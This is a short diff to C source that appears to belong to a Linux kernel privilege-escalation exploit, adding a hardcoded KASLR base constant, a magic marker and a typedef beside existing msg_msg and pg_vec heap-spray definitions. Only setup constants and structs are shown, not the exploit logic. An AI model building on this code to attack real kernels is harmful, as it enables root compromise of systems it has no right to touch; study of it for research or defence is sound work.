@@ -49,7 +49,8 @@
 #define cloneRoot_FLAG              CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND
 #define OPTMEM_MAX_FILE             "/proc/sys/net/core/optmem_max"
 #define INITIAL_PG_VEC_SPRAY        0x200
-
+#define KASLR                       0xffffffff81000000ull //nokaslr value for debugging
+#define MAGIC                       0xFFFFFFFFDEADBEEFull
 
 // Structs
 typedef struct msgSpray_t {
@@ -64,6 +65,7 @@ typedef struct msgQueueMsg{
     char mtext[1];
 } msgMsg;
 typedef size_t u64;
+typedef unsigned int u32;
 
 enum PG_VEC_CMD {
     ADD,
